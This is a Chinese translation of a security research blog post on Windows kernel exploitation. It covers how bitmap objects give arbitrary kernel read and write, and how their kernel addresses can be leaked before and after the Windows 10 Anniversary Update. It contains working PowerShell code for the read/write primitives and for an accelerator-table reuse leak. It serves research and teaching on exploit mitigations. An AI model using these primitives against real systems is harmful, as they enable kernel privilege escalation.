---
title: Bitmap轶事：Windows 10纪念版后的GDI对象泄露
date: 2018-03-21 16:58:11
categories: resources
tags:
	- windows-kernel
	- windows
---
个人翻译收录的一些国外好文章，原文链接：<https://labs.mwrinfosecurity.com/blog/a-tale-of-bitmaps/>

<!--more-->

# Bitmap轶事：Windows 10纪念版后的GDI对象泄露

## 介绍

开始之前，先要吹一波[Nicolas Economou](https://twitter.com/NicoEconomou), Diego Juarez和[KeenLab](https://twitter.com/keen_lab)。是你们全力推动了Windows内核exp技术的发展，又把这些晦涩的知识点慷慨的分享在了众所周知的社区。在Windows 10纪念版(Build 1607)的补丁中，微软打上了一个非常重要的信息泄露的补丁，它此前常用于揭示内核空间中的Bitmap对象的地址。本文讨论了一种应用于纪念版本后的Bitmap对象泄露方法。该方法首次被Nicolas Economou和Diego Juarez在2016年的Ekoparty演讲中提出，标题为 "[Abusing GDI for ring0 exploit primitives: Reloaded](https://www.coresecurity.com/system/files/publications/2016/10/Abusing-GDI-Reloaded-ekoparty-2016_0.pdf)"。

## 资源

下面的资源提供了bitmap在内核exp上下文中使用的背景信息。

- [Abusing GDI for ring0 exploit primitives](https://www.coresecurity.com/blog/abusing-gdi-for-ring0-exploit-primitives) ([@CoreSecurity](https://twitter.com/CoreSecurity))
- [Abusing GDI Reloaded](https://www.coresecurity.com/system/files/publications/2016/10/Abusing-GDI-Reloaded-ekoparty-2016_0.pdf) ([@CoreSecurity](https://twitter.com/CoreSecurity))
- [This Time Font hunt you down in 4 bytes](http://www.slideshare.net/PeterHlavaty/windows-kernel-exploitation-this-time-font-hunt-you-down-in-4-bytes) ([@keen_lab](https://twitter.com/keen_lab))

## 背景

自2015年以来，Bitmap广泛的被滥用于内核内存污染exp。内核bitmap surface对象头包含了一个成员（pvScan0），它指向了bitmap的首个扫描行。从exp的视角来看，该成员提供了一个强大的ring0本源（primitive），这是因为有着一大堆GDI API调用会在这一指针上进行直接操作，尤其是[GetBitmapBits](https://msdn.microsoft.com/en-us/library/windows/desktop/dd144850%28v=vs.85%29.aspx)和[SetBitmapBits](https://msdn.microsoft.com/en-us/library/windows/desktop/dd162962%28v=vs.85%29.aspx)。如果内存污染使得攻击者可以修改该指针，这些API调用本质上就提供了一个内核空间的任意地址读写。这一方法非常通用且可以在大多数的包含多种形式任意写的内核漏洞中使用。

本技术一个完整的exp超过了本文所讲的范围但是我们会叙述它的本质。首先，攻击者创建了两个Bitmap对象，一个作为Manager，另一个作为Worker。借助内核漏洞下一步就可以修改Manager bitmap对象的pvScan0指针使其指向Worker的pvScan0。一旦完成这一步，SetBitmapBits可以被Manager调用来修改Worker的pointer，此后在Worker bitmap上调用SetBitmapsBits/GetBitmapBits就可以实现任意地址读写。该实现逻辑的示例函数如下。

```powershell
# Arbitrary kernel read
function Bitmap-Read {
    param ($Address)
    $CallResult = [API]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
    [IntPtr]$Pointer = [API]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
    $CallResult = [API]::GetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, $Pointer)
    if ($x32){
        [System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
    } else {
        [System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
    }
    $CallResult = [API]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
}
 
# Arbitrary kernel write
function Bitmap-Write {
    param ($Address, $Value)
    $CallResult = [API]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
    $CallResult = [API]::SetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
}
```

## 纪念版之前的泄露

当Bitmap对象由进程创建后，进程PEB的GdiSharedHandleTable就增加了一个条目。如下图所示。

![](/images/exploit/misc/20180321_1.jpg)

`_GDI_CELL`中的pKernelAddress泄露出了Bitmap对象在内核空间的地址。既然进程可以追溯其本身的PEB，那么泄露出bitmap内核对象地址也就是按图索骥。下面的PowerShell函数可以在纪念版补丁前用来创建一个Manager和Worker bitmap。

```powershell
function Stage-BitmapReadWrite {
<#
.SYNOPSIS
    Get PowerShell PEB, create manager&worker bitmaps and leak kernel objects.
    Warning: This only works up to Windows 10 v1607!

.DESCRIPTION
    Author: Ruben Boonen (@FuzzySec)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

.EXAMPLE
    C:\PS> Stage-BitmapReadWrite
    ManagerpvScan0       : -7692227456944
    WorkerHandleTable    : 767454567328
    ManagerKernelObj     : -7692227457024
    PEB                  : 8757247991808
    WorkerpvScan0        : -7692227415984
    ManagerHandle        : -737866269
    WorkerHandle         : 2080706172
    GdiSharedHandleTable : 767454478336
    ManagerHandleTable   : 767454563656
    WorkerKernelObj      : -7692227416064
    
    C:\PS> $BitMapObject = Stage-BitmapReadWrite
    C:\PS> "{0:X}" -f $BitMapObject.ManagerKernelObj
    FFFFF9010320F000
#>

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	
	[StructLayout(LayoutKind.Sequential)]
	public struct _PROCESS_BASIC_INFORMATION
	{
		public IntPtr ExitStatus;
		public IntPtr PebBaseAddress;
		public IntPtr AffinityMask;
		public IntPtr BasePriority;
		public UIntPtr UniqueProcessId;
		public IntPtr InheritedFromUniqueProcessId;
	}
	[StructLayout(LayoutKind.Explicit, Size = 256)]
	public struct _PEB
	{
		[FieldOffset(148)]
		public IntPtr GdiSharedHandleTable32;
		[FieldOffset(248)]
		public IntPtr GdiSharedHandleTable64;
	}
	[StructLayout(LayoutKind.Sequential)]
	public struct _GDI_CELL
	{
		public IntPtr pKernelAddress;
		public UInt16 wProcessId;
		public UInt16 wCount;
		public UInt16 wUpper;
		public UInt16 wType;
		public IntPtr pUserAddress;
	}
	public static class Gdi32
	{
		[DllImport("gdi32.dll")]
		public static extern IntPtr CreateBitmap(
			int nWidth,
			int nHeight,
			uint cPlanes,
			uint cBitsPerPel,
			IntPtr lpvBits);
	}
	public static class Ntdll
	{
		[DllImport("ntdll.dll")]
		public static extern int NtQueryInformationProcess(
			IntPtr processHandle, 
			int processInformationClass,
			ref _PROCESS_BASIC_INFORMATION processInformation,
			int processInformationLength,
			ref int returnLength);
	}
"@

	# Flag architecture $x32Architecture/!$x32Architecture
	if ([System.IntPtr]::Size -eq 4) {
		$x32Architecture = 1
	}

	# Current Proc handle
	$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle

	# Process Basic Information
	$PROCESS_BASIC_INFORMATION = New-Object _PROCESS_BASIC_INFORMATION
	$PROCESS_BASIC_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PROCESS_BASIC_INFORMATION)
	$returnLength = New-Object Int
	$CallResult = [Ntdll]::NtQueryInformationProcess($ProcHandle, 0, [ref]$PROCESS_BASIC_INFORMATION, $PROCESS_BASIC_INFORMATION_Size, [ref]$returnLength)

	# Lazy PEB parsing
	$_PEB = New-Object _PEB
	$_PEB = $_PEB.GetType()
	$BufferOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64()
	$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
	$PEBFlags = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr, [type]$_PEB)

	# _GDI_CELL size
	$_GDI_CELL = New-Object _GDI_CELL
	$_GDI_CELL_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($_GDI_CELL)

	# Manager Bitmap
	[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
	$ManagerBitmap = [Gdi32]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
	if ($x32Architecture) {
		$ManagerHandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
		$ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($ManagerHandleTableEntry)
		$ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($ManagerHandleTableEntry)) + 0x30
	} else {
		$ManagerHandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
		$ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($ManagerHandleTableEntry)
		$ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($ManagerHandleTableEntry)) + 0x50
	}

	# Worker Bitmap
	[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
	$WorkerBitmap = [Gdi32]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
	if ($x32Architecture) {
		$WorkerHandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
		$WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($WorkerHandleTableEntry)
		$WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($WorkerHandleTableEntry)) + 0x30
	} else {
		$WorkerHandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
		$WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($WorkerHandleTableEntry)
		$WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($WorkerHandleTableEntry)) + 0x50
	}

	$BitMapObject = @()
	$HashTable = @{
		PEB = if ($x32Architecture){$PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt32()}else{$PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64()}
		GdiSharedHandleTable = if ($x32Architecture){$PEBFlags.GdiSharedHandleTable32.ToInt32()}else{$PEBFlags.GdiSharedHandleTable64.ToInt64()}
		ManagerHandle = $ManagerBitmap
		ManagerHandleTable = $ManagerHandleTableEntry
		ManagerKernelObj = $ManagerKernelObj
		ManagerpvScan0 = $ManagerpvScan0
		WorkerHandle = $WorkerBitmap
		WorkerHandleTable = $WorkerHandleTableEntry
		WorkerKernelObj = $WorkerKernelObj
		WorkerpvScan0 = $WorkerpvScan0
	}
	$Object = New-Object PSObject -Property $HashTable
	$BitMapObject += $Object
	$BitMapObject
}
```

函数的输出如下所示。注意，为了方便，句柄和地址都使用了十进制数来表示。

![](/images/exploit/misc/20180321_2.jpg)

[Process hacker](http://processhacker.sourceforge.net/)可以用来核实这些结果。

![](/images/exploit/misc/20180321_3.jpg)

##纪念版之后的泄露

纪念版的补丁用哑数据替代了`_GDI_CELL`中的pKernelAddress，以此阻止内核对象泄露。该ring0手法的终结让一大堆exp开发者黯然伤神，然而事实上这就结束了吗？谁说泄露Bitmap对象只能靠PEB的？

当bitmap对象创建后，它们分配在内核的分页会话池中。

![](/images/exploit/misc/20180321_4.jpg)

下面的用户对象列表都放在该分页池中，MSDN官方的说法。

![](/images/exploit/misc/20180321_5.jpg)

在当前最新的Windows 10版本中，可以泄露出这些对象的内核地址。下图阐释了进程使用accelerator table的示例。

![](/images/exploit/misc/20180321_6.jpg)

`_HANDLEENTRY`结构体的phead成员揭示了accelerator table的内核对象地址。如果我们创建一个accelerator table，泄露出它的地址，释放它并分配一个相同大小的bitmap对象的话，就可以强制内核来重用这段被释放的内存。想要保证该UAF风格的信息泄露百分百可靠，我们需要做的就是让对象足够大，比如4KB或更大一些，来阻止任意重用。

![](/images/exploit/misc/20180321_7.jpg)

这一操作完成后，我们就拿到了bitmap的地址，他就是accelerator table此前的地址，然后就可以重用以前的ring0手法了！下面给出PowerShell中的示例代码。

```powershell
function Stage-gSharedInfoBitmap {
<#
.SYNOPSIS
    Universal Bitmap leak using accelerator tables, 32/64 bit Win7-10 (+post anniversary).

.DESCRIPTION
    Author: Ruben Boonen (@FuzzySec)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

.EXAMPLE
	PS C:\Users\b33f> Stage-gSharedInfoBitmap |fl
	
	BitmapKernelObj : -7692235059200
	BitmappvScan0   : -7692235059120
	BitmapHandle    : 1845828432
	
	PS C:\Users\b33f> $Manager = Stage-gSharedInfoBitmap
	PS C:\Users\b33f> "{0:X}" -f $Manager.BitmapKernelObj
	FFFFF901030FF000
#>

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	public static class gSharedInfoBitmap
	{
		[DllImport("gdi32.dll")]
		public static extern IntPtr CreateBitmap(
		    int nWidth,
		    int nHeight,
		    uint cPlanes,
		    uint cBitsPerPel,
		    IntPtr lpvBits);
		[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
		public static extern IntPtr LoadLibrary(
		    string lpFileName);
		
		[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
		public static extern IntPtr GetProcAddress(
		    IntPtr hModule,
		    string procName);
		[DllImport("user32.dll")]
		public static extern IntPtr CreateAcceleratorTable(
		    IntPtr lpaccl,
		    int cEntries);
		[DllImport("user32.dll")]
		public static extern bool DestroyAcceleratorTable(
		    IntPtr hAccel);
	}
"@

	# Check Arch
	if ([System.IntPtr]::Size -eq 4) {
		$x32 = 1
	}

	function Create-AcceleratorTable {
	    [IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(10000)
	    $AccelHandle = [gSharedInfoBitmap]::CreateAcceleratorTable($Buffer, 700) # +4 kb size
	    $User32Hanle = [gSharedInfoBitmap]::LoadLibrary("user32.dll")
	    $gSharedInfo = [gSharedInfoBitmap]::GetProcAddress($User32Hanle, "gSharedInfo")
	    if ($x32){
	        $gSharedInfo = $gSharedInfo.ToInt32()
	    } else {
	        $gSharedInfo = $gSharedInfo.ToInt64()
	    }
	    $aheList = $gSharedInfo + [System.IntPtr]::Size
	    if ($x32){
	        $aheList = [System.Runtime.InteropServices.Marshal]::ReadInt32($aheList)
	        $HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0xc # _HANDLEENTRY.Size = 0xC
	        $phead = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleEntry)
	    } else {
	        $aheList = [System.Runtime.InteropServices.Marshal]::ReadInt64($aheList)
	        $HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0x18 # _HANDLEENTRY.Size = 0x18
	        $phead = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleEntry)
	    }

	    $Result = @()
	    $HashTable = @{
	        Handle = $AccelHandle
	        KernelObj = $phead
	    }
	    $Object = New-Object PSObject -Property $HashTable
	    $Result += $Object
	    $Result
	}

	function Destroy-AcceleratorTable {
	    param ($Hanlde)
	    $CallResult = [gSharedInfoBitmap]::DestroyAcceleratorTable($Hanlde)
	}

	$KernelArray = @()
	for ($i=0;$i -lt 20;$i++) {
	    $KernelArray += Create-AcceleratorTable
	    if ($KernelArray.Length -gt 1) {
	        if ($KernelArray[$i].KernelObj -eq $KernelArray[$i-1].KernelObj) {
	            Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
	            [IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4)
	            $BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x701, 2, 1, 8, $Buffer) # # +4 kb size -lt AcceleratorTable
	            break
	        }
	    }
	    Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
	}

	$BitMapObject = @()
	$HashTable = @{
	    BitmapHandle = $BitmapHandle
	    BitmapKernelObj = $($KernelArray[$i].KernelObj)
	    BitmappvScan0 = if ($x32) {$($KernelArray[$i].KernelObj) + 0x32} else {$($KernelArray[$i].KernelObj) + 0x50}
	}
	$Object = New-Object PSObject -Property $HashTable
	$BitMapObject += $Object
	$BitMapObject
}
```

该函数的输出如下。

![](/images/exploit/misc/20180321_8.jpg)

为了核实这一地址（accelerator table此前用到所用）确实包含了我们的bitmap，可以在KD中执行`!pool ADDRESS`。

![](/images/exploit/misc/20180321_9.jpg)

## 结论

有效的exp缓解措施需要一定的不同策略，其中包含了漏洞补丁、保护增强以及消除已知的exp技术。微软在后两类策略中持之以恒的做出了努力，它们富有成效且大大的增强了Windows内核的安全性。这些提升增加了内核exp开发的难度，且在某些情况下完全消除了这一类bug。然而，如本文所展示，新的技术会被挖掘出来，道高一尺魔高一丈！

关于Windows 10纪念版补丁中的新缓解措施的更多细节可以在这里找到[here](https://www.blackhat.com/docs/us-16/materials/us-16-Weston-Windows-10-Mitigation-Improvements.pdf)。